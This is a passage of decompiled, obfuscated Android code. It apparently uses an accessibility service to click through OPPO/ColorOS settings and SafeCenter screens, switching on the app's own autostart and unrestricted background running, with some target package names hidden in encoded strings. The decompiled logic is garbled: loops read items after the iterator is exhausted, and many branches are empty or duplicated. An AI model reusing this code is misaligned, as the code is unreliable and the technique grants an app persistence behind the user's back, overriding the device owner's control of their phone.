                                                            oppoStepsSimplified$e$1.f54536a3 = i12;
                                                            oppoStepsSimplified$e$1.f54541a8 = 11;
                                                            if (c0368a59.m212354f9(500L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                                                                c0368a59.m212313a8("耗电管理");
                                                                oppoStepsSimplified$e$1.f54533a0 = c0368a59;
                                                                oppoStepsSimplified$e$1.f54538a5 = z3;
                                                                oppoStepsSimplified$e$1.f54536a3 = i12;
                                                                oppoStepsSimplified$e$1.f54541a8 = 12;
                                                                if (c0368a59.m212354f9(300L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                                                                    List listM213306g5 = AbstractC0716jf.m213306g5("完全允许后台行为", "允许应用后台行为", "允许完全后台行为", "允许后台运行", "完全后台行为", "后台运行", "允许后台活动");
                                                                    it7 = listM213306g5.iterator();
                                                                    while (true) {
                                                                        if (!it7.hasNext()) {
                                                                            String str10 = (String) it7.next();
                                                                            if (c0368a59.m212319b7(str10)) {
                                                                                AbstractC0003a2.m46c7("✅ 开启[", str10, "]成功（开关方式）");
                                                                                i12 = 1;
                                                                            }
                                                                        }
                                                                    }
                                                                    if (i12 == 0) {
                                                                        Iterator it10 = listM213306g5.iterator();
                                                                        while (true) {
                                                                            if (it10.hasNext()) {
                                                                                String str11 = (String) it10.next();
                                                                                if (c0368a59.m212313a8(str11)) {
                                                                                    AbstractC0003a2.m46c7("✅ 点击[", str11, "]成功（单选按钮方式）");
                                                                                    i12 = 1;
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                    oppoStepsSimplified$e$1.f54533a0 = c0368a59;
                                                                    oppoStepsSimplified$e$1.f54538a5 = z3;
                                                                    oppoStepsSimplified$e$1.f54536a3 = i12;
                                                                    oppoStepsSimplified$e$1.f54541a8 = 13;
                                                                    if (c0368a59.m212354f9(1000L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                                                                        c0368a59.m212313a8("允许");
                                                                        oppoStepsSimplified$e$1.f54533a0 = c0368a59;
                                                                        oppoStepsSimplified$e$1.f54538a5 = z3;
                                                                        oppoStepsSimplified$e$1.f54536a3 = i12;
                                                                        oppoStepsSimplified$e$1.f54541a8 = 14;
                                                                        if (c0368a59.m212354f9(300L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                                                                            oppoStepsSimplified$e$1.f54533a0 = c0368a59;
                                                                            oppoStepsSimplified$e$1.f54538a5 = z3;
                                                                            oppoStepsSimplified$e$1.f54536a3 = i12;
                                                                            oppoStepsSimplified$e$1.f54541a8 = 15;
                                                                            if (c0368a59.m212345e9(oppoStepsSimplified$e$1) != coroutineSingletons) {
                                                                                z2 = z3;
                                                                                c0368a56 = c0368a59;
                                                                                str8 = str4;
                                                                                if (z2) {
                                                                                    c0368a56.getClass();
                                                                                    m212303e0("❌ 自启动开关未成功");
                                                                                } else {
                                                                                    c0368a56.m212341e5(c0368a56.f55130b9);
                                                                                    m212303e0("✅ 自启动开关流程完成");
                                                                                }
                                                                                if (i12 == 0) {
                                                                                    c0368a56.m212341e5(c0368a56.f55129b8);
                                                                                    m212303e0("✅ 后台行为流程完成");
                                                                                } else {
                                                                                    c0368a56.getClass();
                                                                                    m212303e0("❌ 后台行为未成功");
                                                                                }
                                                                                if (z2 || i12 == 0) {
                                                                                    String str12 = "⚠️ 自启动流程部分完成: 自启动=" + (!z2) + ", 后台=" + (i12 == 0);
                                                                                    c0368a56.getClass();
                                                                                    m212303e0(str12);
                                                                                } else {
                                                                                    c0368a56.m212341e5(str8);
                                                                                    m212303e0("✅ e()自启动+后台行为全部完成");
                                                                                }
                                                                                c0368a56.getClass();
                                                                                m212303e0("✅ e()自启动完成");
                                                                                return c1351vv2;
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                } else {
                    oppoStepsSimplified$e$1.f54533a0 = this;
                    oppoStepsSimplified$e$1.f54536a3 = 0;
                    oppoStepsSimplified$e$1.f54537a4 = 0;
                    oppoStepsSimplified$e$1.f54541a8 = 16;
                    if (m212343e7(oppoStepsSimplified$e$1) != coroutineSingletons) {
                        c0368a57 = this;
                        i13 = 0;
                        i14 = 0;
                        int i20 = i14;
                        str8 = str4;
                        str5 = "]成功";
                        it8 = AbstractC0716jf.m213306g5("允许自动启动", "允许应用自启动", "自动启动", "允许自启动", "开机自启动").iterator();
                        while (true) {
                            if (it8.hasNext()) {
                                i8 = i20;
                            } else {
                                String str13 = (String) it8.next();
                                if (c0368a57.m212319b7(str13)) {
                                    AbstractC0003a2.m46c7("✅ 直接开启自启动成功 [", str13, "]");
                                    i8 = 1;
                                }
                            }
                        }
                        oppoStepsSimplified$e$1.f54533a0 = c0368a57;
                        oppoStepsSimplified$e$1.f54536a3 = i8;
                        oppoStepsSimplified$e$1.f54537a4 = i13;
                        oppoStepsSimplified$e$1.f54541a8 = 17;
                        if (c0368a57.m212354f9(300L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                            i15 = i13;
                            c0368a54 = c0368a57;
                            it9 = AbstractC0716jf.m213306g5("耗电管理", "耗电保护", "电量消耗", "耗电详情", "电池").iterator();
                            while (true) {
                                if (!it9.hasNext()) {
                                    String str14 = (String) it9.next();
                                    if (c0368a54.m212313a8(str14)) {
                                        AbstractC0003a2.m46c7("✅ 进入[", str14, "]");
                                    }
                                }
                            }
                            oppoStepsSimplified$e$1.f54533a0 = c0368a54;
                            oppoStepsSimplified$e$1.f54536a3 = i8;
                            oppoStepsSimplified$e$1.f54537a4 = i15;
                            oppoStepsSimplified$e$1.f54541a8 = 18;
                            int i21 = i15;
                            if (c0368a54.m212354f9(300L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                                i16 = i21;
                                if (i8 == 0) {
                                    for (String str15 : AbstractC0716jf.m213306g5("允许应用自启动", "允许自动启动", "自动启动", "允许自启动", "开机自启动", "自启动")) {
                                        if (c0368a54.m212319b7(str15)) {
                                            str3 = str5;
                                            AbstractC0003a2.m46c7("✅ 开启[", str15, str3);
                                            i8 = 1;
                                            if (i8 == 0) {
                                                c0368a54.getClass();
                                                m212303e0("[SafeCenter] 应用详情未找到自启动开关，尝试SafeCenter路径...");
                                                int i22 = i16;
                                                C0368a5 c0368a510 = c0368a54;
                                                it2 = AbstractC0716jf.m213306g5(new Pair(StringUtil.m212470a0("KFYcdE43ACFFPjgXAjtLPQ8rWSUuSw=="), "com.coloros.safecenter.permission.startup.StartupAppListActivity"), new Pair(StringUtil.m212470a0("KFYcdEIoHCEZIipfFA=="), "com.oppo.safe.permission.startup.StartupAppListActivity"), new Pair("com.oplus.safecenter", "com.oplus.safecenter.permission.startup.StartupAppListActivity"), new Pair(StringUtil.m212470a0("KFYcdE43ACFFPjgXAjtLPQ8rWSUuSw=="), "com.coloros.safecenter.startupapp.view.StartupAppListActivity"), new Pair("com.oplus.safecenter", "com.oplus.safecenter.startupapp.view.StartupAppListActivity")).iterator();
                                                i5 = i8;
                                                i18 = i22;
                                                oppoStepsSimplified$e$1 = oppoStepsSimplified$e$1;
                                                r1 = c0368a510;
                                                if (!it2.hasNext()) {
                                                    Pair pair = (Pair) it2.next();
                                                    String str16 = (String) pair.f57556a0;
                                                    str = str3;
                                                    String str17 = (String) pair.f57557a1;
                                                    try {
                                                    } catch (Exception e2) {
                                                        e = e2;
                                                        str6 = str17;
                                                        str2 = str7;
                                                        c1351vv = r1;
                                                        i2 = i18;
                                                        c1351vv3 = c1351vv;
                                                        i3 = i5;
                                                        String str92 = "[SafeCenter] ❌ 打开[" + str6 + "]失败: " + e.getMessage();
                                                        c1351vv3.getClass();
                                                        m212303e0(str92);
                                                        i18 = i2;
                                                        str3 = str;
                                                        str7 = str2;
                                                        r1 = c1351vv3;
                                                        i5 = i3;
                                                        if (!it2.hasNext()) {
                                                        }
                                                    }
                                                    Intent intent = new Intent();
                                                    str2 = str7;
                                                    intent.setComponent(new ComponentName(str16, str17));
                                                    intent.setFlags(1350631424);
                                                    r1.f55112a1.startActivity(intent);
                                                    oppoStepsSimplified$e$1.f54533a0 = r1;
                                                    oppoStepsSimplified$e$1.f54534a1 = it2;
                                                    oppoStepsSimplified$e$1.f54535a2 = str17;
                                                    oppoStepsSimplified$e$1.f54536a3 = i5;
                                                    oppoStepsSimplified$e$1.f54537a4 = i18;
                                                    oppoStepsSimplified$e$1.f54541a8 = 19;
                                                    i2 = i18;
                                                    str6 = str17;
                                                    if (r1.m212354f9(2000L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                                                        Iterator it11 = it2;
                                                        r2 = r1;
                                                        it4 = it11;
                                                        i4 = i2;
                                                        i3 = i5;
                                                        try {
                                                        } catch (Exception e3) {
                                                            Exception e4 = e3;
                                                            it3 = it4;
                                                            i2 = i4;
                                                            c1351vv3 = r2;
                                                            it2 = it3;
                                                            String str18 = "[SafeCenter] ❌ 打开[" + str6 + "]失败: " + e4.getMessage();
                                                            c1351vv3.getClass();
                                                            m212303e0(str18);
                                                            i18 = i2;
                                                            str3 = str;
                                                            str7 = str2;
                                                            r1 = c1351vv3;
                                                            i5 = i3;
                                                            if (!it2.hasNext()) {
                                                            }
                                                        }
                                                        oppoStepsSimplified$e$1.f54533a0 = r2;
                                                        oppoStepsSimplified$e$1.f54534a1 = it4;
                                                        oppoStepsSimplified$e$1.f54535a2 = str6;
                                                        oppoStepsSimplified$e$1.f54536a3 = i3;
                                                        oppoStepsSimplified$e$1.f54537a4 = i4;
                                                        oppoStepsSimplified$e$1.f54541a8 = 20;
                                                        it3 = it4;
                                                        i2 = i4;
                                                        i3 = i3;
                                                        if (r2.m212352f7(3, 1500L, oppoStepsSimplified$e$1) == coroutineSingletons) {
                                                        }
                                                        accessibilityNodeInfoM212335d8 = r2.m212335d8();
                                                        if (accessibilityNodeInfoM212335d8 != null) {
                                                            try {
                                                            } catch (Exception e5) {
                                                                e = e5;
                                                                c1351vv3 = r2;
                                                                it2 = it3;
                                                                i3 = i3;
                                                                String str922 = "[SafeCenter] ❌ 打开[" + str6 + "]失败: " + e.getMessage();
                                                                c1351vv3.getClass();
                                                                m212303e0(str922);
                                                                i18 = i2;
                                                                str3 = str;
                                                                str7 = str2;
                                                                r1 = c1351vv3;
                                                                i5 = i3;
                                                                if (!it2.hasNext()) {
                                                                }
                                                            }
                                                            CharSequence packageName = accessibilityNodeInfoM212335d8.getPackageName();
                                                            if (packageName == null || (string = packageName.toString()) == null) {
                                                            }
                                                            if (!AbstractC0779a1.m213652a5(string, "safecenter", true) && !AbstractC0779a1.m213652a5(string, "oppo.safe", true)) {
                                                                m212303e0("[SafeCenter] ⚠️ 打开[" + str6 + "]后前台包为" + string + "，不是SafeCenter，继续尝试下一个");
                                                                c1351vv3 = r2;
                                                                i18 = i2;
                                                                it2 = it3;
                                                                str3 = str;
                                                                str7 = str2;
                                                                r1 = c1351vv3;
                                                                i5 = i3;
                                                                if (!it2.hasNext()) {
                                                                    str = str3;
                                                                    str2 = str7;
                                                                    c0368a5 = r1;
                                                                    i = i5;
                                                                    oppoStepsSimplified$e$1.f54533a0 = c0368a5;
                                                                    oppoStepsSimplified$e$1.f54534a1 = null;
                                                                    oppoStepsSimplified$e$1.f54535a2 = null;
                                                                    oppoStepsSimplified$e$1.f54536a3 = i == true ? 1 : 0;
                                                                    oppoStepsSimplified$e$1.f54537a4 = i18;
                                                                    oppoStepsSimplified$e$1.f54541a8 = 21;
                                                                    objM212343e7 = c0368a5.m212343e7(oppoStepsSimplified$e$1);
                                                                    c0368a52 = c0368a5;
                                                                    i6 = i;
                                                                    if (objM212343e7 != coroutineSingletons) {
                                                                        it5 = AbstractC0716jf.m213306g5("耗电管理", "耗电保护", "电量消耗", "耗电详情", "电池").iterator();
                                                                        while (true) {
                                                                            if (!it5.hasNext()) {
                                                                                String str19 = (String) it5.next();
                                                                                if (c0368a52.m212313a8(str19)) {
                                                                                    AbstractC0003a2.m46c7("✅ SafeCenter后回到[", str19, "]");
                                                                                }
                                                                            }
                                                                        }
                                                                        oppoStepsSimplified$e$1.f54533a0 = c0368a52;
                                                                        oppoStepsSimplified$e$1.f54536a3 = i6;
                                                                        oppoStepsSimplified$e$1.f54537a4 = i18;
                                                                        oppoStepsSimplified$e$1.f54541a8 = 22;
                                                                        if (c0368a52.m212354f9(300L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                                                                            c0368a53 = c0368a52;
                                                                            i7 = i6;
                                                                            i9 = i18;
                                                                            i8 = i7;
                                                                            c0368a54 = c0368a53;
                                                                            oppoStepsSimplified$e$1.f54533a0 = c0368a54;
                                                                            oppoStepsSimplified$e$1.f54536a3 = i8;
                                                                            oppoStepsSimplified$e$1.f54537a4 = i9;
                                                                            oppoStepsSimplified$e$1.f54541a8 = 23;
                                                                            if (c0368a54.m212354f9(1000L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                                                                                r6 = i8;
                                                                                c0368a55 = c0368a54;
                                                                                i10 = i9;
                                                                                it6 = AbstractC0716jf.m213306g5("允许完全后台行为", "允许应用后台行为", "允许后台运行", "完全后台行为", "后台运行", "允许后台活动", "完全允许后台行为").iterator();
                                                                                while (true) {
                                                                                    if (!it6.hasNext()) {
                                                                                        String str20 = (String) it6.next();
                                                                                        if (c0368a55.m212319b7(str20)) {
                                                                                            AbstractC0003a2.m46c7(str2, str20, str);
                                                                                            i10 = 1;
                                                                                        }
                                                                                    }
                                                                                }
                                                                                oppoStepsSimplified$e$1.f54533a0 = c0368a55;
                                                                                oppoStepsSimplified$e$1.f54536a3 = r6;
                                                                                oppoStepsSimplified$e$1.f54537a4 = i10;
                                                                                oppoStepsSimplified$e$1.f54541a8 = 24;
                                                                                if (c0368a55.m212354f9(1000L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                                                                                    c0368a55.m212313a8("允许#确定");
                                                                                    oppoStepsSimplified$e$1.f54533a0 = c0368a55;
                                                                                    oppoStepsSimplified$e$1.f54536a3 = r6;
                                                                                    oppoStepsSimplified$e$1.f54537a4 = i10;
                                                                                    oppoStepsSimplified$e$1.f54541a8 = 25;
                                                                                    if (c0368a55.m212354f9(300L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                                                                                        oppoStepsSimplified$e$12 = oppoStepsSimplified$e$1;
                                                                                        c0368a56 = c0368a55;
                                                                                        oppoStepsSimplified$e$12.f54533a0 = c0368a56;
                                                                                        oppoStepsSimplified$e$12.f54536a3 = r6;
                                                                                        oppoStepsSimplified$e$12.f54537a4 = i10;
                                                                                        oppoStepsSimplified$e$12.f54541a8 = 26;
                                                                                        if (c0368a56.m212345e9(oppoStepsSimplified$e$12) != coroutineSingletons) {
                                                                                            i11 = i10;
                                                                                            z = r6;
                                                                                            i12 = i11;
                                                                                            z2 = z;
                                                                                            if (z2) {
                                                                                            }
                                                                                            if (i12 == 0) {
                                                                                            }
                                                                                            if (z2) {
                                                                                                if (!z2) {
                                                                                                }
                                                                                                if (i12 == 0) {
                                                                                                }
                                                                                                String str122 = "⚠️ 自启动流程部分完成: 自启动=" + (!z2) + ", 后台=" + (i12 == 0);
                                                                                                c0368a56.getClass();
                                                                                                m212303e0(str122);
                                                                                            }
                                                                                            c0368a56.getClass();
                                                                                            m212303e0("✅ e()自启动完成");
                                                                                            return c1351vv2;
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                            m212303e0("[SafeCenter] ✅ 成功进入SafeCenter自启动管理页，查找[" + r2.m212334d7() + "]...");
                                                            M212320b8 = r2.m212320b8(r2.m212334d7());
                                                            if (M212320b8 == 0) {
                                                                m212303e0("[SafeCenter] ✅ SafeCenter路径开启自启动成功");
                                                            } else {
                                                                m212303e0("[SafeCenter] ❌ 未能在SafeCenter列表中开启[" + r2.m212334d7() + "]自启动");
                                                            }
                                                            c0368a5 = r2;
                                                            i18 = i2;
                                                            i = M212320b8;
                                                            oppoStepsSimplified$e$1.f54533a0 = c0368a5;
                                                            oppoStepsSimplified$e$1.f54534a1 = null;
                                                            oppoStepsSimplified$e$1.f54535a2 = null;
                                                            oppoStepsSimplified$e$1.f54536a3 = i == true ? 1 : 0;
                                                            oppoStepsSimplified$e$1.f54537a4 = i18;
                                                            oppoStepsSimplified$e$1.f54541a8 = 21;
                                                            objM212343e7 = c0368a5.m212343e7(oppoStepsSimplified$e$1);
                                                            c0368a52 = c0368a5;
                                                            i6 = i;
                                                            if (objM212343e7 != coroutineSingletons) {
                                                            }
                                                        }
                                                        string = "";
                                                        if (!AbstractC0779a1.m213652a5(string, "safecenter", true)) {
                                                            m212303e0("[SafeCenter] ⚠️ 打开[" + str6 + "]后前台包为" + string + "，不是SafeCenter，继续尝试下一个");
                                                            c1351vv3 = r2;
                                                            i18 = i2;
                                                            it2 = it3;
                                                            str3 = str;
                                                            str7 = str2;
                                                            r1 = c1351vv3;
                                                            i5 = i3;
                                                            if (!it2.hasNext()) {
                                                            }
                                                        }
                                                        m212303e0("[SafeCenter] ✅ 成功进入SafeCenter自启动管理页，查找[" + r2.m212334d7() + "]...");
                                                        M212320b8 = r2.m212320b8(r2.m212334d7());
                                                        if (M212320b8 == 0) {
                                                        }
                                                        c0368a5 = r2;
                                                        i18 = i2;
                                                        i = M212320b8;
                                                        oppoStepsSimplified$e$1.f54533a0 = c0368a5;
                                                        oppoStepsSimplified$e$1.f54534a1 = null;
                                                        oppoStepsSimplified$e$1.f54535a2 = null;
                                                        oppoStepsSimplified$e$1.f54536a3 = i == true ? 1 : 0;
                                                        oppoStepsSimplified$e$1.f54537a4 = i18;
                                                        oppoStepsSimplified$e$1.f54541a8 = 21;
                                                        objM212343e7 = c0368a5.m212343e7(oppoStepsSimplified$e$1);
                                                        c0368a52 = c0368a5;
                                                        i6 = i;
                                                        if (objM212343e7 != coroutineSingletons) {
                                                        }
                                                    }
                                                }
                                            } else {
                                                str = str3;
                                                str2 = "✅ 开启[";
                                                i9 = i16;
                                                oppoStepsSimplified$e$1.f54533a0 = c0368a54;
                                                oppoStepsSimplified$e$1.f54536a3 = i8;
                                                oppoStepsSimplified$e$1.f54537a4 = i9;
                                                oppoStepsSimplified$e$1.f54541a8 = 23;
                                                if (c0368a54.m212354f9(1000L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                                                }
                                            }
                                        }
                                    }
                                }
                                str3 = str5;
                                if (i8 == 0) {
                                }
                            }
                        }
                    }
                }
                return coroutineSingletons;
            case 1:
                c1351vv2 = c1351vv4;
                int i23 = oppoStepsSimplified$e$1.f54536a3;
                c0368a58 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                i12 = i23;
                str4 = str8;
                oppoStepsSimplified$e$1.f54533a0 = c0368a58;
                oppoStepsSimplified$e$1.f54536a3 = i12;
                oppoStepsSimplified$e$1.f54541a8 = 2;
                if (c0368a58.m212314a9("应用", 5, oppoStepsSimplified$e$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 2:
                c1351vv2 = c1351vv4;
                int i24 = oppoStepsSimplified$e$1.f54536a3;
                c0368a58 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                i12 = i24;
                str4 = str8;
                oppoStepsSimplified$e$1.f54533a0 = c0368a58;
                oppoStepsSimplified$e$1.f54536a3 = i12;
                oppoStepsSimplified$e$1.f54541a8 = 3;
                j = 300;
                if (c0368a58.m212354f9(300L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 3:
                c1351vv2 = c1351vv4;
                int i25 = oppoStepsSimplified$e$1.f54536a3;
                c0368a58 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                i12 = i25;
                str4 = str8;
                j = 300;
                c0368a58.m212313a8("自启动#自启动管理");
                oppoStepsSimplified$e$1.f54533a0 = c0368a58;
                oppoStepsSimplified$e$1.f54536a3 = i12;
                oppoStepsSimplified$e$1.f54541a8 = 4;
                if (c0368a58.m212354f9(j, oppoStepsSimplified$e$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 4:
                c1351vv2 = c1351vv4;
                int i26 = oppoStepsSimplified$e$1.f54536a3;
                c0368a58 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                i12 = i26;
                str4 = str8;
                oppoStepsSimplified$e$1.f54533a0 = c0368a58;
                oppoStepsSimplified$e$1.f54536a3 = i12;
                oppoStepsSimplified$e$1.f54541a8 = 5;
                if (c0368a58.m212352f7(3, 1500L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 5:
                c1351vv2 = c1351vv4;
                int i27 = oppoStepsSimplified$e$1.f54536a3;
                c0368a58 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                i12 = i27;
                str4 = str8;
                strM212334d7 = c0368a58.m212334d7();
                oppoStepsSimplified$e$1.f54533a0 = c0368a58;
                oppoStepsSimplified$e$1.f54536a3 = i12;
                oppoStepsSimplified$e$1.f54541a8 = 6;
                if (c0368a58.m212314a9(strM212334d7, 25, oppoStepsSimplified$e$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 6:
                c1351vv2 = c1351vv4;
                int i28 = oppoStepsSimplified$e$1.f54536a3;
                c0368a58 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                i12 = i28;
                str4 = str8;
                oppoStepsSimplified$e$1.f54533a0 = c0368a58;
                oppoStepsSimplified$e$1.f54536a3 = i12;
                oppoStepsSimplified$e$1.f54541a8 = 7;
                if (c0368a58.m212354f9(300L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 7:
                c1351vv2 = c1351vv4;
                int i29 = oppoStepsSimplified$e$1.f54536a3;
                c0368a58 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                i12 = i29;
                str4 = str8;
                zM212319b7 = c0368a58.m212319b7(c0368a58.m212334d7());
                if (zM212319b7) {
                }
                oppoStepsSimplified$e$1.f54533a0 = c0368a58;
                oppoStepsSimplified$e$1.f54538a5 = zM212319b7;
                oppoStepsSimplified$e$1.f54536a3 = i12;
                oppoStepsSimplified$e$1.f54541a8 = 8;
                if (c0368a58.m212354f9(1000L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 8:
                c1351vv2 = c1351vv4;
                int i30 = oppoStepsSimplified$e$1.f54536a3;
                z3 = oppoStepsSimplified$e$1.f54538a5;
                c0368a59 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                i12 = i30;
                str4 = str8;
                oppoStepsSimplified$e$1.f54533a0 = c0368a59;
                oppoStepsSimplified$e$1.f54538a5 = z3;
                oppoStepsSimplified$e$1.f54536a3 = i12;
                oppoStepsSimplified$e$1.f54541a8 = 9;
                if (c0368a59.m212345e9(oppoStepsSimplified$e$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 9:
                c1351vv2 = c1351vv4;
                int i31 = oppoStepsSimplified$e$1.f54536a3;
                z3 = oppoStepsSimplified$e$1.f54538a5;
                c0368a59 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                i12 = i31;
                str4 = str8;
                oppoStepsSimplified$e$1.f54533a0 = c0368a59;
                oppoStepsSimplified$e$1.f54538a5 = z3;
                oppoStepsSimplified$e$1.f54536a3 = i12;
                oppoStepsSimplified$e$1.f54541a8 = 10;
                if (c0368a59.m212343e7(oppoStepsSimplified$e$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 10:
                c1351vv2 = c1351vv4;
                int i32 = oppoStepsSimplified$e$1.f54536a3;
                z3 = oppoStepsSimplified$e$1.f54538a5;
                c0368a59 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                i12 = i32;
                str4 = str8;
                oppoStepsSimplified$e$1.f54533a0 = c0368a59;
                oppoStepsSimplified$e$1.f54538a5 = z3;
                oppoStepsSimplified$e$1.f54536a3 = i12;
                oppoStepsSimplified$e$1.f54541a8 = 11;
                if (c0368a59.m212354f9(500L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case oe0.DEFAULT_M /* 11 */:
                c1351vv2 = c1351vv4;
                int i33 = oppoStepsSimplified$e$1.f54536a3;
                z3 = oppoStepsSimplified$e$1.f54538a5;
                c0368a59 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                i12 = i33;
                str4 = str8;
                c0368a59.m212313a8("耗电管理");
                oppoStepsSimplified$e$1.f54533a0 = c0368a59;
                oppoStepsSimplified$e$1.f54538a5 = z3;
                oppoStepsSimplified$e$1.f54536a3 = i12;
                oppoStepsSimplified$e$1.f54541a8 = 12;
                if (c0368a59.m212354f9(300L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                c1351vv2 = c1351vv4;
                int i34 = oppoStepsSimplified$e$1.f54536a3;
                z3 = oppoStepsSimplified$e$1.f54538a5;
                c0368a59 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                i12 = i34;
                str4 = str8;
                List listM213306g52 = AbstractC0716jf.m213306g5("完全允许后台行为", "允许应用后台行为", "允许完全后台行为", "允许后台运行", "完全后台行为", "后台运行", "允许后台活动");
                it7 = listM213306g52.iterator();
                while (true) {
                    if (!it7.hasNext()) {
                    }
                }
                if (i12 == 0) {
                }
                oppoStepsSimplified$e$1.f54533a0 = c0368a59;
                oppoStepsSimplified$e$1.f54538a5 = z3;
                oppoStepsSimplified$e$1.f54536a3 = i12;
                oppoStepsSimplified$e$1.f54541a8 = 13;
                if (c0368a59.m212354f9(1000L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 13:
                c1351vv2 = c1351vv4;
                int i35 = oppoStepsSimplified$e$1.f54536a3;
                z3 = oppoStepsSimplified$e$1.f54538a5;
                c0368a59 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                i12 = i35;
                str4 = str8;
                c0368a59.m212313a8("允许");
                oppoStepsSimplified$e$1.f54533a0 = c0368a59;
                oppoStepsSimplified$e$1.f54538a5 = z3;
                oppoStepsSimplified$e$1.f54536a3 = i12;
                oppoStepsSimplified$e$1.f54541a8 = 14;
                if (c0368a59.m212354f9(300L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 14:
                c1351vv2 = c1351vv4;
                int i36 = oppoStepsSimplified$e$1.f54536a3;
                z3 = oppoStepsSimplified$e$1.f54538a5;
                c0368a59 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                i12 = i36;
                str4 = str8;
                oppoStepsSimplified$e$1.f54533a0 = c0368a59;
                oppoStepsSimplified$e$1.f54538a5 = z3;
                oppoStepsSimplified$e$1.f54536a3 = i12;
                oppoStepsSimplified$e$1.f54541a8 = 15;
                if (c0368a59.m212345e9(oppoStepsSimplified$e$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                c1351vv2 = c1351vv4;
                int i37 = oppoStepsSimplified$e$1.f54536a3;
                z2 = oppoStepsSimplified$e$1.f54538a5;
                c0368a56 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                i12 = i37;
                str4 = str8;
                str8 = str4;
                if (z2) {
                }
                if (i12 == 0) {
                }
                if (z2) {
                }
                c0368a56.getClass();
                m212303e0("✅ e()自启动完成");
                return c1351vv2;
            case 16:
                c1351vv2 = c1351vv4;
                int i38 = oppoStepsSimplified$e$1.f54537a4;
                int i39 = oppoStepsSimplified$e$1.f54536a3;
                C0368a5 c0368a511 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                i13 = i38;
                c0368a57 = c0368a511;
                str4 = str8;
                i14 = i39;
                int i202 = i14;
                str8 = str4;
                str5 = "]成功";
                it8 = AbstractC0716jf.m213306g5("允许自动启动", "允许应用自启动", "自动启动", "允许自启动", "开机自启动").iterator();
                while (true) {
                    if (it8.hasNext()) {
                    }
                }
                oppoStepsSimplified$e$1.f54533a0 = c0368a57;
                oppoStepsSimplified$e$1.f54536a3 = i8;
                oppoStepsSimplified$e$1.f54537a4 = i13;
                oppoStepsSimplified$e$1.f54541a8 = 17;
                if (c0368a57.m212354f9(300L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 17:
                c1351vv2 = c1351vv4;
                i15 = oppoStepsSimplified$e$1.f54537a4;
                i8 = oppoStepsSimplified$e$1.f54536a3;
                c0368a54 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                str5 = "]成功";
                it9 = AbstractC0716jf.m213306g5("耗电管理", "耗电保护", "电量消耗", "耗电详情", "电池").iterator();
                while (true) {
                    if (!it9.hasNext()) {
                    }
                }
                oppoStepsSimplified$e$1.f54533a0 = c0368a54;
                oppoStepsSimplified$e$1.f54536a3 = i8;
                oppoStepsSimplified$e$1.f54537a4 = i15;
                oppoStepsSimplified$e$1.f54541a8 = 18;
                int i212 = i15;
                if (c0368a54.m212354f9(300L, oppoStepsSimplified$e$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 18:
                c1351vv2 = c1351vv4;
                i16 = oppoStepsSimplified$e$1.f54537a4;
                i8 = oppoStepsSimplified$e$1.f54536a3;
                c0368a54 = oppoStepsSimplified$e$1.f54533a0;
                kg1.m213544f4(obj);
                str5 = "]成功";
                if (i8 == 0) {
                }
                str3 = str5;
                if (i8 == 0) {
                }
                break;
            case Base64.Encoder.LINE_GROUPS /* 19 */:
                c1351vv2 = c1351vv4;
